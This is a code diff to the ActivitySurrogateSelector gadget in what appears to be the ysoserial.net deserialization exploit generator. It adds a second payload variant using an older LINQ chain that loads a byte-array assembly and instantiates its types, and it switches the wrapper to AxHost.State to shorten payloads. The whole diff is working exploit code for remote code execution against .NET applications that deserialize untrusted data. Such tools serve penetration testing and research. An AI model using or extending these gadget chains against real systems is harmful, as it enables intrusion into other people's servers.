@@ -10,6 +10,7 @@ using System.Runtime.Serialization.Formatters.Binary;
 using System.Web.UI.WebControls;
 using System.Runtime.Serialization;
 using ysoserial.Helpers;
+using NDesk.Options;
 
 namespace ysoserial.Generators
 {
@@ -33,13 +34,12 @@ namespace ysoserial.Generators
     public class PayloadClass : ISerializable
     {
         protected byte[] assemblyBytes;
-        public PayloadClass()
+        private int variant_number = 1;
+        public PayloadClass() : this(1) { }
+        public PayloadClass(int variant_number)
         {
+            this.variant_number = variant_number;
             this.assemblyBytes = File.ReadAllBytes(Path.Combine(Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location), "e.dll"));
-        }
-
-        protected PayloadClass(SerializationInfo info, StreamingContext context)
-        {
         }
         private IEnumerable<TResult> CreateWhereSelectEnumerableIterator<TSource, TResult>(IEnumerable<TSource> src, Func<TSource, bool> predicate, Func<TSource, TResult> selector)
         {
@@ -48,89 +48,118 @@ namespace ysoserial.Generators
               .MakeGenericType(typeof(TSource), typeof(TResult));
             return t.GetConstructors()[0].Invoke(new object[] { src, predicate, selector }) as IEnumerable<TResult>;
         }
+        protected PayloadClass(SerializationInfo info, StreamingContext context)
+        {
+        }
+
         public void GetObjectData(SerializationInfo info, StreamingContext context)
         {
             System.Diagnostics.Trace.WriteLine("In GetObjectData");
+            DesignerVerb verb = null;
+            Hashtable ht = null;
+            List<object> ls = null;
+            //variant 2, old technique
+            if (this.variant_number == 2)
+            {
+                // Build a chain to map a byte array to creating an instance of a class.
+                // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
+                List<byte[]> data = new List<byte[]>();
+                data.Add(this.assemblyBytes);
+                var e1 = data.Select(Assembly.Load);
+                Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
+                var e2 = e1.SelectMany(map_type);
+                var e3 = e2.Select(Activator.CreateInstance);
 
+                // PagedDataSource maps an arbitrary IEnumerable to an ICollection
+                PagedDataSource pds = new PagedDataSource() { DataSource = e3 };
+                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
+                // Class is internal so need to use reflection.
+                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
+
+                // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
+                verb = new DesignerVerb("", null);
+                // Need to insert IDictionary using reflection.
+                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);
+
+                // Pre-load objects, this ensures they're fixed up before building the hash table.
+                ls = new List<object>();
+                ls.Add(e1);
+                ls.Add(e2);
+                ls.Add(e3);
+                ls.Add(pds);
+                ls.Add(verb);
+                ls.Add(dict);
+            }
+            //Default, use compatible mode.
             //Old technique contains a compiler-generated class [System.Core]System.Linq.Enumerable+<SelectManyIterator>d__[Compiler_Generated_Class_SEQ]`2,
             //the Compiler_Generated_Class_SEQ may NOT same in different version of .net framework. 
             //For example, in .net framework 4.6 was 16,and 17 in .net framework 4.7.
-
-            /*
-            // Build a chain to map a byte array to creating an instance of a class.
-            // byte[] -> Assembly.Load -> Assembly -> Assembly.GetType -> Type[] -> Activator.CreateInstance -> Win!
-            List<byte[]> data = new List<byte[]>();
-            data.Add(this.assemblyBytes);
-            var e1 = data.Select(Assembly.Load);
-            Func<Assembly, IEnumerable<Type>> map_type = (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate(typeof(Func<Assembly, IEnumerable<Type>>), typeof(Assembly).GetMethod("GetTypes"));
-            var e2 = e1.SelectMany(map_type);
-            var e3 = e2.Select(Activator.CreateInstance);
-            */
-
             //New technique use [System.Core]System.Linq.Enumerable+WhereSelectEnumerableIterator`2 only to fix it.
             //It make compatible from v3.5 to lastest(needs to using v3.5 compiler, and may also need to call disable type check first if target runtime was v4.8+).
             //Execution chain: Assembly.Load(byte[]).GetTypes().GetEnumerator().{MoveNext(),get_Current()} -> Activator.CreateInstance() -> Win!
-            byte[][] e1 = new byte[][] { assemblyBytes };
-            IEnumerable<Assembly> e2 = CreateWhereSelectEnumerableIterator<byte[], Assembly>(e1, null, Assembly.Load);
-            IEnumerable<IEnumerable<Type>> e3 = CreateWhereSelectEnumerableIterator<Assembly, IEnumerable<Type>>(e2,
-                null,
-                (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate
+            else
+            {
+                byte[][] e1 = new byte[][] { assemblyBytes };
+                IEnumerable<Assembly> e2 = CreateWhereSelectEnumerableIterator<byte[], Assembly>(e1, null, Assembly.Load);
+                IEnumerable<IEnumerable<Type>> e3 = CreateWhereSelectEnumerableIterator<Assembly, IEnumerable<Type>>(e2,
+                    null,
+                    (Func<Assembly, IEnumerable<Type>>)Delegate.CreateDelegate
+                        (
+                            typeof(Func<Assembly, IEnumerable<Type>>),
+                            typeof(Assembly).GetMethod("GetTypes")
+                        )
+                );
+                IEnumerable<IEnumerator<Type>> e4 = CreateWhereSelectEnumerableIterator<IEnumerable<Type>, IEnumerator<Type>>(e3,
+                    null,
+                    (Func<IEnumerable<Type>, IEnumerator<Type>>)Delegate.CreateDelegate
                     (
-                        typeof(Func<Assembly, IEnumerable<Type>>),
-                        typeof(Assembly).GetMethod("GetTypes")
+                        typeof(Func<IEnumerable<Type>, IEnumerator<Type>>),
+                        typeof(IEnumerable<Type>).GetMethod("GetEnumerator")
                     )
-            );
-            IEnumerable<IEnumerator<Type>> e4 = CreateWhereSelectEnumerableIterator<IEnumerable<Type>, IEnumerator<Type>>(e3,
-                null,
-                (Func<IEnumerable<Type>, IEnumerator<Type>>)Delegate.CreateDelegate
-                (
-                    typeof(Func<IEnumerable<Type>, IEnumerator<Type>>),
-                    typeof(IEnumerable<Type>).GetMethod("GetEnumerator")
-                )
-            );
-            //bool MoveNext(this) => Func<IEnumerator<Type>,bool> => predicate
-            //Type get_Current(this) => Func<IEnumerator<Type>,Type> => selector
-            //
-            //WhereSelectEnumerableIterator`2.MoveNext => 
-            //  if(predicate(IEnumerator<Type>)) {selector(IEnumerator<Type>);} =>
-            //  IEnumerator<Type>.MoveNext();return IEnumerator<Type>.Current;
-            IEnumerable<Type> e5 = CreateWhereSelectEnumerableIterator<IEnumerator<Type>, Type>(e4,
-                (Func<IEnumerator<Type>, bool>)Delegate.CreateDelegate
-                (
-                    typeof(Func<IEnumerator<Type>, bool>),
-                    typeof(IEnumerator).GetMethod("MoveNext")
-                ),
-                (Func<IEnumerator<Type>, Type>)Delegate.CreateDelegate
-                (
-                    typeof(Func<IEnumerator<Type>, Type>),
-                    typeof(IEnumerator<Type>).GetProperty("Current").GetGetMethod()
-                )
-            );
-            IEnumerable<object> end = CreateWhereSelectEnumerableIterator<Type, object>(e5, null, Activator.CreateInstance);
-            // PagedDataSource maps an arbitrary IEnumerable to an ICollection
-            PagedDataSource pds = new PagedDataSource() { DataSource = end };
-            // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
-            // Class is internal so need to use reflection.
-            IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
+                );
+                //bool MoveNext(this) => Func<IEnumerator<Type>,bool> => predicate
+                //Type get_Current(this) => Func<IEnumerator<Type>,Type> => selector
+                //
+                //WhereSelectEnumerableIterator`2.MoveNext => 
+                //  if(predicate(IEnumerator<Type>)) {selector(IEnumerator<Type>);} =>
+                //  IEnumerator<Type>.MoveNext();return IEnumerator<Type>.Current;
+                IEnumerable<Type> e5 = CreateWhereSelectEnumerableIterator<IEnumerator<Type>, Type>(e4,
+                    (Func<IEnumerator<Type>, bool>)Delegate.CreateDelegate
+                    (
+                        typeof(Func<IEnumerator<Type>, bool>),
+                        typeof(IEnumerator).GetMethod("MoveNext")
+                    ),
+                    (Func<IEnumerator<Type>, Type>)Delegate.CreateDelegate
+                    (
+                        typeof(Func<IEnumerator<Type>, Type>),
+                        typeof(IEnumerator<Type>).GetProperty("Current").GetGetMethod()
+                    )
+                );
+                IEnumerable<object> end = CreateWhereSelectEnumerableIterator<Type, object>(e5, null, Activator.CreateInstance);
+                // PagedDataSource maps an arbitrary IEnumerable to an ICollection
+                PagedDataSource pds = new PagedDataSource() { DataSource = end };
+                // AggregateDictionary maps an arbitrary ICollection to an IDictionary 
+                // Class is internal so need to use reflection.
+                IDictionary dict = (IDictionary)Activator.CreateInstance(typeof(int).Assembly.GetType("System.Runtime.Remoting.Channels.AggregateDictionary"), pds);
 
-            // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
-            DesignerVerb verb = new DesignerVerb("", null);
-            // Need to insert IDictionary using reflection.
-            typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);
+                // DesignerVerb queries a value from an IDictionary when its ToString is called. This results in the linq enumerator being walked.
+                verb = new DesignerVerb("", null);
+                // Need to insert IDictionary using reflection.
+                typeof(MenuCommand).GetField("properties", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(verb, dict);
 
-            // Pre-load objects, this ensures they're fixed up before building the hash table.
-            List<object> ls = new List<object>();
-            ls.Add(e1);
-            ls.Add(e2);
-            ls.Add(e3);
-            ls.Add(e4);
-            ls.Add(e5);
-            ls.Add(end);
-            ls.Add(pds);
-            ls.Add(verb);
-            ls.Add(dict);
-
-            Hashtable ht = new Hashtable();
+                // Pre-load objects, this ensures they're fixed up before building the hash table.
+                ls = new List<object>();
+                ls.Add(e1);
+                ls.Add(e2);
+                ls.Add(e3);
+                ls.Add(e4);
+                ls.Add(e5);
+                ls.Add(end);
+                ls.Add(pds);
+                ls.Add(verb);
+                ls.Add(dict);
+            }
+            ht = new Hashtable();
 
             // Add two entries to table.
             /*
@@ -161,6 +190,7 @@ namespace ysoserial.Generators
 
             // Wrap the object inside a DataSet. This is so we can use the custom
             // surrogate selector. Idiocy added and removed here.
+            /*
             info.SetType(typeof(System.Data.DataSet));
             info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
             info.AddValue("DataSet.DataSetName", "");
@@ -176,20 +206,43 @@ namespace ysoserial.Generators
             fmt.SurrogateSelector = new MySurrogateSelector();
             fmt.Serialize(stm, ls);
             info.AddValue("DataSet.Tables_0", stm.ToArray());
+            //*/
+
+            //* saving around  404 characters by using AxHost.State instead of DataSet
+            // However, DataSet can apply to more applications
+            // https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.axhost.state
+            // vs
+            // https://docs.microsoft.com/en-us/dotnet/api/system.data.dataset
+            BinaryFormatter fmt = new BinaryFormatter();
+            MemoryStream stm = new MemoryStream();
+            fmt.SurrogateSelector = new MySurrogateSelector();
+            fmt.Serialize(stm, ls);
+            info.SetType(typeof(System.Windows.Forms.AxHost.State));
+            info.AddValue("PropertyBagBinary", stm.ToArray());
+            //*/
         }
     }
 
     class ActivitySurrogateSelectorGenerator : GenericGenerator
     {
-   
-        public override string Description()
+        private int variant_number = 1;
+
+        public override OptionSet Options()
         {
-            return "This gadget ignores the command parameter and executes the constructor of ExploitClass class.";
+            OptionSet options = new OptionSet()
+            {
+                {"var|variant=", "Payload variant number where applicable. Choices: 1, 2 based on formatter.", v => int.TryParse(v, out this.variant_number) },
+            };
+            return options;
+        }
+        public override string AdditionalInfo()
+        {
+            return "This gadget ignores the command parameter and executes the constructor of ExploitClass class";
         }
 
         public override List<string> SupportedFormatters()
         {
-            return new List<string> { "BinaryFormatter", "ObjectStateFormatter", "SoapFormatter", "LosFormatter" };
+            return new List<string> { "BinaryFormatter (2)", "ObjectStateFormatter", "SoapFormatter", "LosFormatter" };
         }
 
         public override string Name()
@@ -209,7 +262,7 @@ namespace ysoserial.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            PayloadClass payload = new PayloadClass();
+            PayloadClass payload = new PayloadClass(variant_number);
             return Serialize(payload, formatter, inputArgs);
         }
 
